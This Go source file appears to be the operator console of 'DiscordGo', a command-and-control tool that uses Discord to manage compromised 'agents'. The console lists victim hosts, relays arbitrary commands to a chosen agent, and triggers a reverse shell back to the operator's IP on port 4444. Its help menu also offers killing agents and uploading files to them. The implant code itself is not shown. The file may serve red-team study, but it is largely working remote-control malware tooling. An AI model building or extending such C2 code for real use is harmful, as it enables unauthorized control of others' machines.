// +build linux

package cli

import (
	"fmt"
	"io"
	"os"
	"strings"

	"DiscordGo/pkg/agents"
	"DiscordGo/pkg/message"
	"DiscordGo/pkg/util"

	"github.com/bwmarrin/discordgo"
	"github.com/chzyer/readline"
	"github.com/olekukonko/tablewriter"
)

var Prompt *readline.Instance

// Taking from their example
func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

var completer = readline.NewPrefixCompleter()

func MainCompleter() {
	var items []readline.PrefixCompleterInterface

	for _, agent := range agents.Agents {
		items = append(items, readline.PcItem(agent.Agent.UUID))
	}

	completer = readline.NewPrefixCompleter(
		readline.PcItem("help"),
		readline.PcItem("exit"),
		readline.PcItem("agents"),
		readline.PcItem("interact",
			items...),
	)

	Prompt.Config.AutoComplete = completer

}

func AgentCompleter() {
	var items []readline.PrefixCompleterInterface

	for _, agent := range agents.Agents {
		items = append(items, readline.PcItem(agent.Agent.UUID))
	}

	completer = readline.NewPrefixCompleter(
		readline.PcItem("help"),
		readline.PcItem("exit"),
		readline.PcItem("agents"),
		readline.PcItem("interact",
			items...),
	)

	Prompt.Config.AutoComplete = completer

}

// ASCIIArt is HEREEEEEE
var ASCIIArt = `

@@@@@@@  @@@  @@@@@@  @@@@@@@  @@@@@@  @@@@@@@  @@@@@@@        @@@@@@@  @@@@@@ 
@@!  @@@ @@! !@@     !@@      @@!  @@@ @@!  @@@ @@!  @@@      !@@      @@   @@@
@!@  !@! !!@  !@@!!  !@!      @!@  !@! @!@!!@!  @!@  !@!      !@!        .!!@! 
!!:  !!! !!:     !:! :!!      !!:  !!! !!: :!!  !!:  !!!      :!!       !!:    
:: :  :  :   ::.: :   :: :: :  : :. :   :   : : :: :  :        :: :: : :.:: :::
																	   
`

// Shell is start of the command line mode
func Shell(dg *discordgo.Session) {
	promtpState := "main"
	focusedAgent := ""

	// Setting up command prompt with another package
	// because golang just sucks
	// Also with these, I get history file
	readlinePrompt, err := readline.NewEx(&readline.Config{
		Prompt:          "\033[31mDiscordGo>>> \033[0m",
		HistoryFile:     "/tmp/readline.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	// Doing this so I can change the prompt later on
	Prompt = readlinePrompt
	MainCompleter()

	if err != nil {
		panic(err)
	}
	defer readlinePrompt.Close()

	for {
		command, _ := readlinePrompt.Readline()
		if err == readline.ErrInterrupt {
			if len(command) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}
		command = strings.TrimSpace(command)
		cmd := strings.Fields(command)

		if len(cmd) > 0 {
			switch promtpState {
			case "main":
				switch cmd[0] {
				case "help":
					mainMenuHelp()
				case "exit":
					fmt.Println("Exiting.")
					os.Exit(0)
				case "interact":
					if len(cmd) > 1 {
						// if uuid is given, check if that UUID exist
						if agents.DoesAgentExist(cmd[1]) {
							focusedAgent = cmd[1]
							// TODO: Fix color scheme
							Prompt.SetPrompt("\033[31mDiscordGo[\033[32m" + cmd[1] + "\033[31m]>> \033[0m")
							promtpState = "agent"
						} else {
							fmt.Println("Agent: " + cmd[1] + " does not exist")
						}
					} else {
						// if no uuid is provided, say id needs to provided
						fmt.Println("You need to provide an agent ID")
					}
				case "agents":
					listAgents()
				}
			case "agent":
				switch cmd[0] {
				case "exit":
					fmt.Println("Exiting....")
					os.Exit(0)
				case "help":
					agentMenuHelp()
				case "back":
					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
					promtpState = "main"
				case "cmd":
					if len(cmd) > 1 {
						fmt.Println("command: ")
						fmt.Println(cmd[1:])
						fmt.Println("Target: " + focusedAgent)
						finalCmd := ""
						for _, precmd := range cmd {
							finalCmd += precmd + " "
						}
						finalCmd = strings.TrimSpace(finalCmd)
						message.CommandMessage(dg, focusedAgent, finalCmd)
					} else {
						fmt.Println("Please provide the command you need executed")
					}
				case "shell":
					fmt.Println("sending a shell to you on port 4444")
					message.SendShell(dg, focusedAgent, util.GetLocalIP())
				case "ping":
					message.Ping(dg, focusedAgent, true)
				case "kill":
					message.KillAgent(dg, focusedAgent)
					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
					promtpState = "main"
				case "agents":
					listAgents()
				}
			}
		}
	}
}

func mainMenuHelp() {
	table := tablewriter.NewWriter(os.Stdout)
	tableData := [][]string{
		{"help", "Display this menu"},
		{"exit", "Exiting the server"},
		{"interact <UUID>", "Something something with agent"},
		{"agents", "List all the connected agents"},
	}

	table.SetHeader([]string{"Command", "Description"})
	table.AppendBulk(tableData)
	table.Render()
}

// TODO: send command to all agents
func agentMenuHelp() {
	table := tablewriter.NewWriter(os.Stdout)
	tableData := [][]string{
		{"help", "Display this menu"},
		{"exit", "Exiting the server"},
		{"kill", "stop/remove the agent"},
		{"command", "send command to the agent"}, 
		{"shell", "send a reverse shell to us"}, // Optional to give their port #
		{"ping", "check if the agent is alive"},
		{"back", "Return back to main menu"},
		{"agents", "List all the connected agents"},
		{"fileupload <source> <destination>", "Upload files to an agent"},
	}

	table.SetHeader([]string{"Command", "Description"})
	table.AppendBulk(tableData)
	table.Render()
}

func listAgents() {
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"ID", "Hostname", "IP", "OS", "Status"})

	agentList := [][]string{}

	for _, agent := range agents.Agents {
		data := []string{}
		data = append(data, agent.Agent.UUID)
		data = append(data, agent.Agent.HostName)
		data = append(data, agent.Agent.IP)
		data = append(data, agent.Agent.OS)
		data = append(data, agent.Status)
		// TODO: Add another column to tell when last heard from server

		if agent.Status == "alive" {
			table.SetColumnColor(tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{tablewriter.FgGreenColor})
		} else {
			table.SetColumnColor(tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{tablewriter.FgRedColor})
		}
		agentList = append(agentList, data)
	}

	table.AppendBulk(agentList)
	table.Render()
}
